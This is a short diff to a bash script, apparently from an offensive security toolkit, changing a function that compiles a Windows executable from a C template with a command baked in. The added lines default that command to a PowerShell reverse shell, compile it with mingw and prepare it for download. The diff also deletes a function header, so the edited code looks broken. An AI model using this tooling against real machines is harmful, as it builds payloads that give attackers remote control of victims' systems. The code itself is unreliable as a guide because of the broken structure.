@@ -124,25 +124,26 @@ create_run_windows_shell_dll() {
 
 create_run_windows_exe() {
     local command=""
-    if [ ! -z "$cmd" ]; then
-        command="$cmd"
-    fi
     if [ ! -z "$1" ]; then
         command="$1"
+    fi
+    if [[ ! -z "$cmd" ]] && [[ -z "$command" ]]; then
+        command="$cmd"
+    fi
+    if [[ -z "$command" ]]; then
+        command=$(get_powershell_reverse_shell)
     fi
     if [ -z "$run_windows_filename" ]; then
         run_windows_filename="run_windows"
     fi
+    string_length=${#command}
+    echo "The length of the cmd string is: $string_length"
+    command=$(echo $command | sed -E 's/"/\\"/g')
     command=$(escape_sed "$command")
     cp "$SCRIPTDIR/../c/run_windows.c" $run_windows_filename.c
-
     sed -E -i 's/\{command\}/'"$command"'/g' $run_windows_filename.c
     x86_64-w64-mingw32-gcc -o $run_windows_filename.exe $run_windows_filename.c
     generate_windows_download "$run_windows_filename.exe"
-}
-
-create_run_windows_dll() {
-    local command="$1"
     if [ -z "$command" ]; then
         echo "Command is required for creating run_windows_dll."
         exit 1
